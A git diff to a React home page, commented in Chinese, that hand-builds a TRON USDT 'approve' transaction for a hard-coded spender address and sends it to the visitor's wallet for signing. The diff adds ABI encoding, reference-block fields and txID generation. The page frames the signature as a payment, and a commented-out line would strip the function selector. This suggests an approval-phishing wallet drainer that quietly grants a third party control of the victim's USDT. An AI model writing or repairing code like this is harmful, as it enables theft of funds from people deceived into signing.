@@ -817,15 +817,55 @@ export default function HomePage() {
 
       // ==========【方案B 纯净无冲突代码，旧拼装代码全部删除】==========
       // 1. 构造 approve calldata
-      const METHOD_SELECTOR = "0x095ea7b3";
-      // 钱包付款地址 -> hex格式（不带0x）
-      const ownerHex = tronWeb.address.toHex(walletAddress).replace("0x", "");
-      // USDT授权接收方地址hex（不带0x）
-      const spenderHex = tronWeb.address.toHex(USDT_SPENDER_ADDRESS).replace("0x", "");
-      // 授权额度 补全64位16进制
-      const amountHex = BigInt(amountBaseUnits).toString(16).padStart(64, "0");
-      // 拼接完整data，移除开头0x
-      const fullDataHex = (METHOD_SELECTOR + spenderHex + amountHex).replace("0x", "");
+      const METHOD_SELECTOR = "095ea7b3";
+      // 钱包付款地址 -> TRON hex格式（不带0x，保留41网络前缀）
+      const ownerHex = tronWeb.address.toHex(walletAddress).replace(/^0x/i, "");
+      // USDT授权接收方地址 -> TRON hex格式（不带0x）
+      const spenderTronHex = tronWeb.address.toHex(USDT_SPENDER_ADDRESS).replace(/^0x/i, "");
+
+      if (
+        spenderTronHex.length !== 42 ||
+        !spenderTronHex.toLowerCase().startsWith("41")
+      ) {
+        throw new Error("授权接收地址的 Hex 格式错误。");
+      }
+
+      // ABI address参数不能带TRON的41网络前缀，并且必须左侧补齐到32字节
+      const spenderHex = spenderTronHex.slice(2).padStart(64, "0");
+
+      // 授权额度补全为32字节uint256
+      const amountRawHex = BigInt(amountBaseUnits).toString(16);
+
+      if (amountRawHex.length > 64) {
+        throw new Error("授权金额超过 uint256 范围。");
+      }
+
+      const amountHex = amountRawHex.padStart(64, "0");
+
+      // 4字节方法选择器 + 32字节address + 32字节uint256
+      const fullDataHex = METHOD_SELECTOR + spenderHex + amountHex;
+
+      if (fullDataHex.length !== 136) {
+        throw new Error(`approve data 长度错误：${fullDataHex.length}`);
+      }
+
+      // 2. 获取并设置TAPOS参考区块字段
+      const latestBlock = await tronWeb.trx.getCurrentBlock();
+      const blockId = latestBlock?.blockID;
+      const blockNumber = latestBlock?.block_header?.raw_data?.number;
+
+      if (
+        !blockId ||
+        blockId.length !== 64 ||
+        blockNumber === undefined ||
+        blockNumber === null
+      ) {
+        throw new Error("获取 TRON 参考区块失败。");
+      }
+
+      const blockNumberHex = BigInt(blockNumber).toString(16).padStart(16, "0");
+      const refBlockBytes = blockNumberHex.slice(-4);
+      const refBlockHash = blockId.slice(16, 32);
 
       // 2. 时间配置
       const nowTs = Date.now();
@@ -835,15 +875,18 @@ export default function HomePage() {
       // 3. 手动构建完整TRON交易结构体（核心）
       const extendedTransaction = {
         visible: false,
-        txID: "",
         raw_data: {
+          ref_block_bytes: refBlockBytes,
+          ref_block_hash: refBlockHash,
           contract: [
             {
               type: TRIGGER_SMART_CONTRACT_TYPE,
               parameter: {
+                type_url: TRIGGER_SMART_CONTRACT_TYPE_URL,
                 value: {
                   owner_address: ownerHex,
-                  contract_address: tronWeb.address.toHex(USDT_CONTRACT_ADDRESS).replace("0x", ""),
+                  contract_address: tronWeb.address.toHex(USDT_CONTRACT_ADDRESS).replace(/^0x/i, ""),
+                  call_value: 0,
                   data: fullDataHex
                 }
               }
@@ -880,6 +923,27 @@ const walletTransaction =
 // if(walletTransaction?.raw_data?.contract?.[0]){
 //   delete walletTransaction.raw_data.contract[0].function_selector;
 // }
+
+// 4. 在签名前根据最终raw_data生成raw_data_hex和txID
+const transactionUtils = TronWeb.utils.transaction;
+const transactionPb = transactionUtils.txJsonToPb(walletTransaction);
+const rawDataBytes = transactionPb.getRawData().serializeBinary();
+
+walletTransaction.raw_data_hex = Array.from(
+  rawDataBytes,
+  (byte) => byte.toString(16).padStart(2, "0")
+).join("");
+
+walletTransaction.txID = transactionUtils
+  .txPbToTxID(transactionPb)
+  .replace(/^0x/i, "");
+
+if (
+  !walletTransaction.raw_data_hex ||
+  !walletTransaction.txID
+) {
+  throw new Error("生成交易哈希或 raw_data_hex 失败。");
+}
 
 const signedTransaction =
     await signTransaction(
